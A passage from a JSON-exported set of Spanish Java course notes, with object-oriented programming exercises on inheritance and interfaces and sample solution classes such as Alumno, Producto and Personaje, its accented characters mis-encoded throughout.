pueden alquilar sombrillas con capacidad para 2 personaso sombrillas especiales, m√°s amplias, para 6 personas y servicio de camarero. En las especiales, tambi√©n se pueden agregar hamacas extra abonando un coste adicional por unidad. El servicio de aparcamiento es opcional en ambos tipos de sombrillas.\nSe necesita implementar las siguientes clases:\n\n- `ReservaSombrilla`: que tendr√° como atributos de clase (est√°ticos) las constantes `costeBase = 200` y `extras=100`; y como atributos de instancia el n√∫mero (entero), los d√≠as (entero) y el servicio de aparcamiento (booleano). Como m√©todos, incluir√°, adem√°s de los t√≠picos (constructor, getters/setters, ...) el c√°lculo del coste de la reserva. Este se calcula como n¬∫ de d√≠as * coste base, salvo que se haya contratado el servicio de aparcamiento, que ser√≠a entonces `dias * (costeBase + extras)`.\n- `ReservaSombrillaEspecial`: que es una subclase de la anterior. A√±ade como atributo el n√∫mero de hamacas que se reservan (como n√∫mero entero). El coste se calcula como el 140% del coste de una sombrilla normal m√°s 1/3 * extras por cada hamaca por d√≠a.\n- `ColeccionAlquiler`: incluir√° un array de reservas, as√≠ como el n√∫mero de reservas realizadas. Adem√°s de un constructor, que recibir√° un entero con el tama√±o con el que se quiere inicializar el array, se deben incluir los siguientes m√©todos:\n- `insertar`: a√±ade la reserva de sombrilla que se pasa como argumento. Requiere controlar que hay hueco disponible para dicha reserva.\n- `eliminar`: recibe un n√∫mero entero como argumento, y elimina la reserva que est√° en dicha posici√≥n del array. El array debe quedar compactado nuevamente.\n- `totalAlquiler`: no recibe ning√∫n argumento, y devuelve el importe total de todas las reservas realizadas.\n\nEjercicio 10\nUna agencia rural de alquiler de veh√≠culos dispone de alquiler de autobuses y tractores.\nLa facturaci√≥n del alquiler de los autobuses se realiza por kil√≥metros. Debido a esto, los datos de la clase son:\n- Precio por km.\n- Cantidad de km. que tiene el autob√∫s cuando se recoge al alquilarlo.\n- Cantidad de km. que tiene el autob√∫s cuando se devuelve al alquilarlo.\n\nEn cambio, el alquiler de tractores se realiza por d√≠as. Los datos de la clase `Tractor` son:\n- Precio por d√≠a.\n- N¬∫ de d√≠as alquilados.\n\nCuando se alquile un veh√≠culo, se debe obtener su matr√≠cula, los datos correspondientes al tipo de veh√≠culo, marcarlos como alquilado (asginando el valor de un atributo booleano a true) y mostrar sus datos en consola.\n\nCuando se devuelve un veh√≠culo, se elimina la marca de alquilado (valor booleano a false), se calcula el importe a pagar por el alquiler y se muestran los datos por consola.\n"},"DAW/Programaci√≥n/Ejercicios-Java/4--Interfaces":{"title":"4- Interfaces","links":["DAW/Programaci√≥n/Ejercicios-Java/Soluciones/Soluciones-bolet√≠n-4"],"tags":[],"content":"Ejercicio 1\nSe necesita implementar un servicio de validaci√≥n de ficheros. Todo fichero que se pueda validar deber√° implementar una interfaz, llamada Validable, que tendr√° un m√©todo cuya firma ser√° boolean isValid(). La validaci√≥n depende del tipo de fichero en cuesti√≥n. Solamente se podr√°n validar clases de tipo Documento, Imagen y Video.\nSe tendr√°n 3 clases abstractas y no selladas, llamadas Documento, Imagen y Video. Para cada una de ellas se necesitar√° un constructor con argumentos y los m√©todos getter/setter.\n\nDe los documentos queremos saber el tama√±o en bytes.\nDe las im√°genes queremos saber el ancho y alto.\nDe los v√≠deos queremos saber su duraci√≥n en segundos.\n\nSe deben crear las siguientes subclases concretas:\n\nDocumentoPDF ‚Üí Documento\nImagenJPG ‚Üí Imagen\nVideoMp4 ‚Üí Video\n\nAqu√≠ tenemos un diagrama UML que ilustra esta estructura.\n\n\nUn DocumentoPDF es v√°lido si su tama√±o es inferior a 1 megabyte.\nUna ImagenJPG ser√° v√°lida si su tama√±o (anchoxalto) es menor a 5 megap√≠xeles (5 millones)\nUn VideoMp4 ser√° v√°lido si su duraci√≥n es menor a 5 minutos.\n\nEl servicio de validaci√≥n ser√° capaz de validar m√∫ltiples ficheros a la vez, de forma que:\n\nTendr√° un array de ficheros a validar, con varios constructores.\nTendr√° un m√©todo que ser√° capaz de validar todos los ficheros.\nDevolver√° true si todos son v√°lidos, false en otro caso.\nTendr√° un m√©todo est√°tico que ser√° capaz de validar un √∫nico fichero.\n\nImplementar una clase main de prueba con algunos datos de ejemplo.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 1\nEjercicio 2\nEn mi barrio hay una ferreter√≠a donde el dependiente es muy ‚Äúapa√±ao‚Äù. Adem√°s de vender tornillos, herramientas y dem√°s, tambi√©n te hace algunas chapuzas en casa si es que t√∫ no sabes hacerlas. Me ha pedido ayuda para implementar un peque√±o sistema de facturaci√≥n.\nTanto las chapuzas como los productos son elementos que comparten en com√∫n que se pueden ‚Äúvender‚Äù, as√≠ que vamos a crear una interfaz llamada Vendible, que tendr√° un m√©todo con la siguiente firma: double getPrecio().\nSe pueden vender tanto Producto como Servicio, con las siguientes especificaciones:\n\nDe cada Producto queremos saber el nombre y la categor√≠a (ambos String).\nDe cada Servicio queremos saber el nombre, el tipo y la duraci√≥n en minutos.\n\nPara calcular el precio, lo haremos de la siguiente forma:\n\nDe cada Producto, almacenaremos el precio como un atributo.\nPara los Servicio, el precio se calcular√° de la siguiente forma, dependiendo del valor del atributo tipo:\n\nSi es &quot;PINTURA&quot;, ser√° a 0.75‚Ç¨ el minuto.\nSi es &quot;ELECTRICIDAD&quot; ser√° a 1‚Ç¨ el minuto.\nSi es &quot;FONTANER√çA&quot; ser√° a 1.25‚Ç¨ el minuto.\nSi es otro, ser√° a 1.5‚Ç¨ el minuto.\n\n\n\nPara poder cobrarle a un cliente, nos pide que le hagamos una clase Factura, que tendr√° el nombre del cliente as√≠ como un array de Vendible. Tambi√©n tendr√° un m√©todo que permitir√° calcular la suma total de productos y servicios facturados.\nImplementa adem√°s una clase Main con algunos datos de ejemplo.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 2\nEjercicio 3\nSea el siguiente diagrama UML:\n\nNecesitamos implementar el reproductor multimedia de un coche, que puede reproducir ficheros de m√∫ltiples tipos, pero no de cualquiera. Como queremos que nuestro modelo sea extensible, seguiremos los siguientes pasos:\n\nCrearemos una interfaz, llamada Fichero, para modelar cualquier tipo de archivo. Esta interfaz tendr√° los dos m√©todos abstractos del diagrama.\nComo la implementaci√≥n ser√° muy com√∫n a todos los ficheros, crearemos una clase base abstracta, llamada FicheroAbstracto, que tendr√° como estado dos atributos: nombre y formato, y que implementar√° la interfaz Fichero.\nPor otro lado, tenemos la interfaz Reproducible, que extiende a Fichero (todo reproducible ser√° un fichero). Esta interfaz tendr√° dos m√©todos:  void reproducir() y int getDuracion(), que devuelve la duraci√≥n en segundos.\nVamos a crear varios tipos de ficheros:\n\nFicheroPDF, que no tendr√° m√°s m√©todos que el constructor con argumentos.\nImagenJPG, AudioMp3 y VideoH264, que adem√°s de extender la clase base FicheroAbstracto implementa Reproducible.\n\n\nPor otro lado, para que nuestro reproductor multimedia sea lo m√°s gen√©rico posible y as√≠ lo podamos portar de la plataforma del coche actual a otras, vamos a crear una interfaz llamada Reproductor, con los siguientes m√©todos:\n\nvoid cargar(Reproducible r) que carga el fichero a reproducir.\nvoid reproducir() que reproduce el fichero cargado\ndefault void reproducir(Reproducible r) que reproduce el fichero que se pasa como argumento. Le daremos una implementaci√≥n por defecto.\nvoid parar() que para la reproducci√≥n actual.\n\n\nLa interfaz Reproductor se ver√° implementada por la clase ReproductorMultimedia, que tendr√° un fichero reproducible actual y aceptar√° un array de ficheros reproducibles (una especie de playlist).\n\nSe deben crear todas las clases anteriores y un main de prueba.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 3\nEjercicio 4\nEstamos pensando en implementar un sitio web en el que se puedan realizar valoraciones y comentarios sobre cualquier cosa: productos, servicios, lugares, ‚Ä¶ Los usuarios podr√°n realizar valoraciones. Para ello vamos a definir la siguiente estructura de clases:\n\nLa interfaz Valorable ser√° implementada por aquellas clases que puedan ser valoradas. Tendr√° un m√©todo que devolver√° la puntuaci√≥n media de todas las valoraciones.\nLa clase Usuario, que ser√°n quienes realicen las valoraciones.\nLa clase Valoracion tendr√° un usuario, un valorable y una puntuaci√≥n (entero del 1 al 5).\nLa clase ValorableAbstracto implementar√° la interfaz Valorable y tendr√° un array de elementos de tipo Valoracion, con todas las valoraciones de dicho ValorableAbstracto. Proporcionar√° una implementaci√≥n por defecto para el c√°lculo de la puntuaci√≥n media.\nLa clase Usuario tambi√©n tendr√° un array con todas las Valoraciones que haya hecho el usuario.\nLas clases Producto, Negocio  y Ciudad extender√°n a ValorableAbstracto a√±adiendo los atributos propios que nos dicte la l√≥gica.\nPor √∫ltimo, la clase ServicioValoracion tendr√° un m√©todo llamado valorar que recibir√° tres argumentos:\n\nUn usuario, que realiza la valoraci√≥n.\nUn Valorable, sobre el que emitir la valoraci√≥n.\nUna puntuaci√≥n entre 1 y 5.\n\n\nEste m√©todo tendr√° que:\n\nCrear el elemento de tipo Valoracion.\nAlmacenarlo en el array de Usuario.\nSi el tipo de Valorable que se ha proporcionado como argumento es ValorableAbstracto, almacenarlo en el array de valoraciones del mismo.\n\n\n\nImplementa todos los m√©todos que creas necesarios y adem√°s, un main de prueba.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 4\nEjercicio 5\nVamos a mejorar el ejercicio 1. Ahora mismo, al validar todos los documentos, podemos saber si todos son v√°lidos o no, pero nos podr√≠a interesar saber cu√°les son los que han fallado. Para ello, realiza los siguientes cambios en ServicioValidacion:\n\nAgrega un m√©todo que permita a√±adir ficheros al array de elementos a validar. Esto se debe hacer de forma consistente, de manera que si al agregar, no caben m√°s elementos en el array, se debe copiar en uno m√°s amplio. Adem√°s, cada vez que se agregue un fichero, se debe incrementar la variable cantidadValidables.\nAgrega el m√©todo inverso, que permita eliminar un fichero del array de validables. Esta eliminaci√≥n se har√° por posici√≥n dentro del array. El array debe quedar en estado consistente.\nA la hora de realizar la validaci√≥n de todos los documentos, se almacenar√° un array de valores booleanos, que tendr√° como tama√±o cantidadValidables, y que almacenar√° true o false en funci√≥n del resultado de la validaci√≥n. Debes a√±adir un m√©todo cuya firma ser√° boolean[] getDetalleValidacion(). De esta forma, si en la posici√≥n 2 del array tenemos un valor false es porque en la posici√≥n 2 del array validables tenemos un fichero no v√°lido.\nA√±ade otro m√©todo, mostrarDetalleValidacion() que muestre por consola el detalle de validaci√≥n de cada fichero. Usando pattern matching, debe mostrar, para cada tipo de fichero conocido, los datos que lo identifican.\n\nEjercicio 6\nVamos a mejorar el ejercicio 2 ya que el ferretero de mi barrio ha visto que su negocio ha prosperado con nuestra aplicaci√≥n de gesti√≥n. Para ello, quiere implementar una clase Catalogo, donde poder a√±adir tanto los productos como los servicios, que se almacenar√°n en un array de Vendible. Esta clase tendr√° los t√≠picos m√©todos para a√±adir un Vendible al cat√°logo, para borrarlo por su posici√≥n en el array y para mostrar la informaci√≥n del cat√°logo, a trav√©s de dos m√©todos:\n- void mostrarInformacionIndividual(Vendible v): deber√° mostrar la informaci√≥n de lo que se vende, de forma que:\n- Si es un Producto, se mostrar√° el nombre, la categor√≠a y el precio.\n- Si es un Servicio, se mostrar√° el nombre, el tipo y la duraci√≥n.\n- void mostrarInformacionCatalogo(), que mostrar√° la informaci√≥n de todos los Vendibles del cat√°logo.\nModifica el m√©todo main para crear un cat√°logo con varios Vendible y utiliza los m√©todos de la clase para mostrarlos por consola.\nEjercicio 7\nVamos a mejorar el ejercicio 3 de la siguiente forma:\n\nSi te das cuenta en el diagrama, todas las clases que implementan Reproducible tambi√©n extienden a FicheroAbstracto y en ellas hemos repetido alg√∫n elemento, como tener una duraci√≥n almacenada (al menos en 2 de ellas es variable, y en otra constante). Crea una nueva clase abstracta, llamada FicheroReproducibleAbstracto, que implemente Reproducible y proponga una implementaci√≥n por defecto para los m√©todos de la interfaz. Modifica las clases ImagenJPG,AudioMp3 y VideoH264 para que extiendan a FicheroReproducibleAbstracto y ajusta su implementaci√≥n.\nEn nuestro ReproductorMultimedia no podemos pasar al siguiente o anterior reproducible de la lista. A√±ade los m√©todos void siguiente() y void anterior() de manera que:\n\nSe parece la reproducci√≥n actual.\nSe cargue el siguiente elemento del array en actual\nSe comience su reproducci√≥n.\n\n\nTen en cuenta que la lista de reproducci√≥n es circular, es decir:\n\nEl siguiente al √∫ltimo es el primero.\nEl anterior al primero es el √∫ltimo.\n\n\n\nEjercicio 8\nVamos a mejorar el ejercicio 4 de forma que:\n\nSe garantice que las valoraciones son de entre 1 y 5.\nSe gestione la posibilidad de agregar m√°s de 10 valoraciones por producto/usuario.\nSe garantice que un mismo usuario no puede valorar m√°s de una vez el mismo valorable.\nAdem√°s de poder valorar num√©ricamente, que los usuarios puedan a√±adir un √∫nico comentario. Para esto √∫ltimo, ¬ød√≥nde crees que deber√≠amos empezar la modificaci√≥n? ¬øCrees que ser√≠a bueno crear una interfaz Comentable?\n"},"DAW/Programaci√≥n/Ejercicios-Java/Soluciones/Soluciones-bolet√≠n-1":{"title":"Soluciones bolet√≠n 1","links":[],"tags":[],"content":"Soluciones ejercicio 1\nAlumno.java\npackage orientacionobjetos;\n \nimport java.util.Objects;\n \npublic class Alumno {\n\t\n\tprivate String nombre;\n\tprivate String apellidos;\n\tprivate String email;\n\tprivate int edad;\n\tprivate String telefono;\n\t\n\tpublic Alumno() { }\n \n\tpublic Alumno(String nombre, String apellidos, String email, int edad, String telefono) {\n\t\tsuper();\n\t\tthis.nombre = nombre;\n\t\tthis.apellidos = apellidos;\n\t\tthis.email = email;\n\t\tthis.edad = edad;\n\t\tthis.telefono = telefono;\n\t}\n \n\tpublic Alumno(String nombre, String apellidos, int edad) {\n\t\tthis.nombre = nombre;\n\t\tthis.apellidos = apellidos;\n\t\tthis.edad = edad;\n\t}\n\t\n\t// Tambi√©n as√≠\n\t/*public Alumno(String nombre, String apellidos, int edad) {\n\t\tthis(nombre, apellidos, null, edad, null);\n\t}*/\n \n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n\tpublic String getApellidos() {\n\t\treturn apellidos;\n\t}\n \n\tpublic String getEmail() {\n\t\treturn email;\n\t}\n \n\tpublic int getEdad() {\n\t\treturn edad;\n\t}\n \n\tpublic String getTelefono() {\n\t\treturn telefono;\n\t}\n \n\tpublic void setNombre(String nombre) {\n\t\tthis.nombre = nombre;\n\t}\n \n\tpublic void setApellidos(String apellidos) {\n\t\tthis.apellidos = apellidos;\n\t}\n \n\tpublic void setEmail(String email) {\n\t\tthis.email = email;\n\t}\n \n\tpublic void setEdad(int edad) {\n\t\tthis.edad = edad;\n\t}\n \n\tpublic void setTelefono(String telefono) {\n\t\tthis.telefono = telefono;\n\t}\n\t\n\tpublic boolean esMayorEdad() {\n\t\treturn (edad &gt;= 18);\n\t}\n \n\t@Override\n\tpublic int hashCode() {\n\t\treturn Objects.hash(apellidos, edad, email, nombre, telefono);\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (obj == null)\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tAlumno other = (Alumno) obj;\n\t\treturn Objects.equals(apellidos, other.apellidos) &amp;&amp; edad == other.edad &amp;&amp; Objects.equals(email, other.email)\n\t\t\t\t&amp;&amp; Objects.equals(nombre, other.nombre) &amp;&amp; Objects.equals(telefono, other.telefono);\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Alumno [nombre=&quot; + nombre + &quot;, apellidos=&quot; + apellidos + &quot;, email=&quot; + email + &quot;, edad=&quot; + edad\n\t\t\t\t+ &quot;, telefono=&quot; + telefono + &quot;]&quot;;\n\t}\n}\nApp.java\npackage orientacionobjetos;\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n\t\t\n\t\tAlumno a1 = new Alumno();\n\t\ta1.setNombre(&quot;Jose&quot;);\n\t\ta1.setApellidos(&quot;Garc√≠a L√≥pez&quot;);\n\t\ta1.setEdad(14);\n\t\ta1.setEmail(&quot;jose.garcia@centroeducativo.com&quot;);\n\t\t\n\t\tSystem.out.println(a1);\n\t\t\n\t\tAlumno a2 = new Alumno(&quot;Mar√≠a&quot;, &quot;Fern√°ndez Mart√≠n&quot;, 17);\n\t\ta2.setEmail(&quot;maria.fernandez@centroeducativo.com&quot;);\n\t\ta2.setTelefono(&quot;600123456&quot;);\n\t\t\n\t\tSystem.out.println(a2);\n\t\t\n\t\tSystem.out.println(&quot;La alumna %s %s %s mayor de edad&quot;\n\t\t\t\t.formatted(\n\t\t\t\t\t\ta2.getNombre(), \n\t\t\t\t\t\ta2.getApellidos(), \n\t\t\t\t\t\ta2.esMayorEdad() ? &quot;s√≠&quot; : &quot;no&quot; ));\n \n\t\tif (a1.equals(a2))\n\t\t\tSystem.out.println(&quot;Son el mismo objeto&quot;);\n\t\telse\n\t\t\tSystem.out.println(&quot;No son el mismo objeto&quot;);\n\t}\n}\n \nSoluciones ejercicio 2\npackage orientacionobjetos;\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n\t\t\n\t\tvar alumnos = new Alumno[5];\n\t\t\n\t\talumnos[0] = new Alumno(&quot;Jos√©&quot;, &quot;Garc√≠a L√≥pez&quot;, 14);\n\t\talumnos[1] = new Alumno(&quot;Mar√≠a&quot;, &quot;Fern√°ndez Mart√≠n&quot;, 17);\n\t\talumnos[2] = new Alumno(&quot;Ra√∫l&quot;, &quot;Miraflores Redondo&quot;, 11);\n\t\talumnos[3] = new Alumno(&quot;Luc√≠a&quot;, &quot;Mu√±oz Seco&quot;, 16);\n\t\talumnos[4] = new Alumno(&quot;Antonio&quot;, &quot;De la Cruz Ser√≥n&quot;, 19);\n\t\t\n\t\t// Por defecto, el alumno m√°s joven ser√° el primero de todos.\n\t\tint posicionMasJoven = 0;\n\t\tfor(int i = 1; i &lt; alumnos.length; i++) {\n\t\t\t// Versi√≥n m√°s larga.\n\t\t\t\n\t\t\t//Alumno a1 = alumnos[posicionMasJoven];\n\t\t\t//Alumno a2 = alumnos[i];\n\t\t\t//if (a1.getEdad() &gt; a2.getEdad())\n\t\t\t//\tposicionMasJoven = i;\n\t\t\t\n\t\t\t// Versi√≥n reducida, aunque el efecto es el mismo.\n\t\t\tif (alumnos[posicionMasJoven].getEdad() &gt; alumnos[i].getEdad()) \n\t\t\t\tposicionMasJoven = i;\n\t\t}\n\t\t\n\t\tAlumno joven = alumnos[posicionMasJoven];\n\t\tSystem.out.println(&quot;El alumno m√°s joven es %s %s con %d a√±os&quot;\n\t\t\t\t.formatted(joven.getNombre(), joven.getApellidos(), joven.getEdad()));\n\t\t\n\t}\n}\nSoluciones ejercicio 3\nProducto.java\npackage orientacionobjetos;\n \nimport java.util.Objects;\n \npublic class Producto {\n\t\n\tprivate long codigo;\n\tprivate String nombre;\n\tprivate String descripcion;\n\tprivate double precio;\n\t\n\t\n\tpublic Producto() { }\n\t\n\tpublic Producto(long codigo, String nombre, String descripcion, double precio) {\n\t\tthis.codigo = codigo;\n\t\tthis.nombre = nombre;\n\t\tthis.descripcion = descripcion;\n\t\tthis.precio = precio;\n\t}\n \n\tpublic long getCodigo() {\n\t\treturn codigo;\n\t}\n \n\tpublic void setCodigo(long codigo) {\n\t\tthis.codigo = codigo;\n\t}\n \n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n\tpublic void setNombre(String nombre) {\n\t\tthis.nombre = nombre;\n\t}\n \n\tpublic String getDescripcion() {\n\t\treturn descripcion;\n\t}\n \n\tpublic void setDescripcion(String descripcion) {\n\t\tthis.descripcion = descripcion;\n\t}\n \n\tpublic double getPrecio() {\n\t\treturn precio;\n\t}\n \n\tpublic void setPrecio(double precio) {\n\t\tthis.precio = precio;\n\t}\n\t\n\tpublic String precioLiteral() {\n\t\tString resultado;\n\t\t\n\t\tif (precio &gt; 0 &amp;&amp; precio &lt; 1.0)\n\t\t\tresultado = &quot;GANGA&quot;;\n\t\telse if (precio &gt;= 1.0 &amp;&amp; precio &lt; 10)\n\t\t\tresultado = &quot;NORMAL&quot;;\n\t\telse\n\t\t\tresultado = &quot;LUJO&quot;;\n\t\t\n\t\treturn resultado;\n\t\t\n\t\t\n\t}\n \n\t@Override\n\tpublic int hashCode() {\n\t\treturn Objects.hash(codigo, descripcion, nombre, precio);\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (obj == null)\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tProducto other = (Producto) obj;\n\t\treturn codigo == other.codigo &amp;&amp; Objects.equals(descripcion, other.descripcion)\n\t\t\t\t&amp;&amp; Objects.equals(nombre, other.nombre)\n\t\t\t\t&amp;&amp; Double.doubleToLongBits(precio) == Double.doubleToLongBits(other.precio);\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Producto [codigo=&quot; + codigo + &quot;, nombre=&quot; + nombre + &quot;, descripcion=&quot; + descripcion + &quot;, precio=&quot;\n\t\t\t\t+ precio + &quot;]&quot;;\n\t}\t\n \n}\n \nApp.java\npackage orientacionobjetos;\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n \n\t\tProducto p1 = new Producto(1234l, &quot;Ordenador port√°til&quot;, &quot;Magn√≠fico ordenador port√°til para programar&quot;, 599.99);\n\t\tProducto p2 = new Producto(2345l, &quot;Monitor 24&quot;, &quot;Estupendo monitor para programar&quot;, 199.99);\n\t\t\n\t\tSystem.out.println(p1.precioLiteral());\n\t\tSystem.out.println(p2.precioLiteral());\n\t\t\n\t\t\n\t}\n \n}\n \nSoluciones ejercicio 4\nPersonaje.java\npackage orientacionobjetos;\n \nimport java.util.Arrays;\nimport java.util.Objects;\n \npublic class Personaje {\n\t\n\tprivate String nombre;\n\tprivate int puntosVida;\n\tprivate long puntos;\n\tprivate String[] mochila;\n\tprivate int elementosEnMochila;\n\t\n\tpublic Personaje() {\n\t\tthis.puntos = 0;\n\t\tthis.puntosVida = 100;\n\t\tthis.mochila = new String[10];\n\t\tthis.elementosEnMochila = 0;\n\t}\n\t\n\tpublic Personaje(String nombre) {\n\t\tthis();\n\t\tthis.nombre = nombre;\n\t}\n \n\tpublic String getNombre() {\n\t\treturn nombre;\n\t}\n \n\tpublic void setNombre(String nombre) {\n\t\tthis.nombre = nombre;\n\t}\n \n\tpublic int getPuntosVida() {\n\t\treturn puntosVida;\n\t}\n \n\tpublic void setPuntosVida(int puntosVida) {\n\t\tthis.puntosVida = puntosVida;\n\t}\n \n\tpublic long getPuntos() {\n\t\treturn puntos;\n\t}\n \n\tpublic void setPuntos(long puntos) {\n\t\tthis.puntos = puntos;\n\t}\n \n\tpublic String[] getMochila() {\n\t\treturn mochila;\n\t}\n\t\n\tpublic int getElementosEnMochila() {\n\t\treturn elementosEnMochila;\n\t}\n\t\n\tpublic int addElementoToMochila(String elemento) {\n\t\tif (elementosEnMochila == 10)\n\t\t\tSystem.out.println(&quot;YA NO PUEDES CONSEGUIR M√ÅS ELEMENTOS PUES TU MOCHILA EST√Å COMPLETA&quot;);\n\t\telse \n\t\t\tmochila[elementosEnMochila] = elemento;\n\t\t\n\t\treturn ++elementosEnMochila;\n\t\t\n\t}\n\t\n\tpublic int recibirGolpe(int puntosGolpe) {\n\t\tthis.puntosVida -= puntosGolpe;\n\t\tif (this.puntosVida &lt; 0)\n\t\t\tthis.puntosVida = 0;\n\t\t\n\t\treturn this.puntosVida;\n\t}\n\t\n\t// Falta reasignar el array y decrementar elementosEnMochila\n\t\n\tpublic int usarBotiquin() {\n\t\tboolean tieneBotiquin = false;\n\t\tif (elementosEnMochila &gt; 0) {\n\t\t\t\n\t\t\tfor(int i = 0; i &lt; elementosEnMochila &amp;&amp; !tieneBotiquin; i++) {\n\t\t\t\tif (mochila[i] == &quot;BOTIQUIN&quot;) {\n\t\t\t\t\ttieneBotiquin = true;\n\t\t\t\t\tthis.puntosVida += 10;\n\t\t\t\t\tif (this.puntosVida &gt; 100)\n\t\t\t\t\t\tthis.puntosVida = 100;\n\t\t\t\t\t\n\t\t\t\t\t// Reasignar resto de elementos del array\n\t\t\t\t\tmochila[i] = null;\n\t\t\t\t\tfor(int x = i+1; x &lt; elementosEnMochila; x++) {\n\t\t\t\t\t\tmochila[x-1] = mochila[x];\n\t\t\t\t\t}\n\t\t\t\t\telementosEnMochila--;\n\t\t\t\t\tmochila[elementosEnMochila] = null;\n\t\t\t\t\t\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (tieneBotiquin == false)\n\t\t\tSystem.out.println(&quot;LO SIENTO, PERO NO TIENES NINGUNA POCI√ìN DE BOTIQU√çN&quot;);\n\t\t\n\t\treturn this.puntosVida;\n\t}\n\t\n \n\t@Override\n\tpublic int hashCode() {\n\t\tfinal int prime = 31;\n\t\tint result = 1;\n\t\tresult = prime * result + Arrays.hashCode(mochila);\n\t\tresult = prime * result + Objects.hash(elementosEnMochila, nombre, puntos, puntosVida);\n\t\treturn result;\n\t}\n \n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (obj == null)\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tPersonaje other = (Personaje) obj;\n\t\treturn elementosEnMochila == other.elementosEnMochila &amp;&amp; Arrays.equals(mochila, other.mochila)\n\t\t\t\t&amp;&amp; Objects.equals(nombre, other.nombre) &amp;&amp; puntos == other.puntos &amp;&amp; puntosVida == other.puntosVida;\n\t}\n \n\t@Override\n\tpublic String toString() {\n\t\treturn &quot;Personaje [nombre=&quot; + nombre + &quot;, puntosVida=&quot; + puntosVida + &quot;, puntos=&quot; + puntos + &quot;, mochila=&quot;\n\t\t\t\t+ Arrays.toString(mochila) + &quot;, elementosEnMochila=&quot; + elementosEnMochila + &quot;]&quot;;\n\t}\n}\n \nApp.java\npackage orientacionobjetos;\n \npublic class App {\n \n\tpublic static void main(String[] args) {\n\t\t\n\t\tPersonaje p1 = new Personaje(&quot;Harry Potter&quot;);\n\t\t\n\t\tp1.recibirGolpe(15);\n\t\t\n\t\tSystem.out.println(p1);\n \n\t\tp1.usarBotiquin();\n \n\t\tp1.addElementoToMochila(&quot;VARITA&quot;);\n\t\tp1.addElementoToMochila(&quot;BOTIQUIN&quot;);\n\t\tp1.addElementoToMochila(&quot;EXPECTO PATRONUM&quot;);\n \n\t\tp1.usarBotiquin();\n\t\tSystem.out.println(p1);\n \n\t}\n \n}\n "},"DAW/Programaci√≥n/Ejercicios-Java/Soluciones/Soluciones-bolet√≠n-2":{"title":"Soluciones bolet√≠n 2","links":[],"tags":[],"content":"Soluciones ejercicio 1\nMuestra.java\npublic class Muestra {\n\t\n\tpublic static final int DEAFULT_SIZE = 10;\n\tprivate int[] numeros;\n\tprivate int cantidadNumeros;\n\t\n\tpublic Muestra() {\n\t\tnumeros = new int[DEAFULT_SIZE];\n\t\tcantidadNumeros = 0;\n\t}\n\t\n\tpublic Muestra(int tam) {\n\t\tnumeros = new int[tam];\n\t\tcantidadNumeros = 0;\n\t}\n\t\n\tpublic Muestra(int[] array) {\n\t\tnumeros = array.clone();\n\t\tcantidadNumeros = numeros.length;\n\t}\n\t\n\tpublic void agregarNumero(int n) {\n\t\tnumeros[cantidadNumeros] = n;\n\t\tcantidadNumeros++;\n\t}\n \n\tpublic int[] getNumeros() {\n\t\treturn numeros;\n\t}\n \n\tpublic int getCantidadNumeros() {\n\t\treturn cantidadNumeros;\n\t}\n \n}\n \nEstadistica.java\npublic class Estadistica {\n\t\n\tpublic static double media(Muestra m) {\n\t\tdouble suma = 0;\n\t\tfor(int i = 0; i &lt; m.getCantidadNumeros(); i++) {\n\t\t\tsuma += m.getNumeros()[i];\n\t\t}\n\t\treturn suma / m.getCantidadNumeros();\n\t}\n\t\n\tpublic static int moda(Muestra m) {\n\t\tint moda = 0;\n        int maxFrecuencia = 0;\n        int n = m.getCantidadNumeros();\n        int[] numeros = m.getNumeros();\n        \n        for (int i = 0; i &lt; n; i++) {\n        \t// Comparamos cada n√∫mero del array con los dem√°s\n            int frecuencia = 0;\n            for (int j = 0; j &lt; n; j++) {\n                if (numeros[j] == numeros[i]) {\n                    frecuencia++;\n                }\n            }\n            if (frecuencia &gt; maxFrecuencia) {\n                maxFrecuencia = frecuencia;\n                moda = numeros[i];\n            }\n        }\n        return moda;\n\t}\n \n}\n \nEjercicio01.java\npublic class Ejercicio01 {\n \n\tpublic static void main(String[] args) {\n\t\tMuestra m1 = new Muestra(new int[] { 1, 2, 2, 3, 4, 5, 6, 7, 8, 9 });\n \n\t\tdouble media = Estadistica.media(m1);\n\t\tSystem.out.println(&quot;La media es &quot; + media);\n \n\t\tint moda = Estadistica.moda(m1);\n\t\tSystem.out.println(&quot;La moda es &quot; + moda);\n \n\t}\n \n}\nSoluciones ejercicio 2\nMuestra.java\npublic class Muestra {\n\t\n\tpublic static final int DEFAULT_SIZE = 10;\n\tprivate int[] numeros;\n\tprivate int cantidadNumeros;\n\t\n\tpublic Muestra() {\n\t\tnumeros = new int[DEFAULT_SIZE];\n\t\tcantidadNumeros = 0;\n\t}\n\t\n\tpublic Muestra(int tam) {\n\t\tnumeros = new int[tam];\n\t\tcantidadNumeros = 0;\n\t}\n\t\n\tpublic Muestra(int[] array) {\n\t\tnumeros = array.clone();\n\t\tcantidadNumeros = numeros.length;\n\t}\n\t\n\tpublic void agregarNumero(int n) {\n\t\tif (cantidadNumeros == numeros.length) {\n\t\t\tagrandaArray();\n\t\t}\n\t\tnumeros[cantidadNumeros] = n;\n\t\tcantidadNumeros++;\n\t}\n \n\tpublic int[] getNumeros() {\n\t\treturn numeros;\n\t}\n \n\tpublic int getCantidadNumeros() {\n\t\treturn 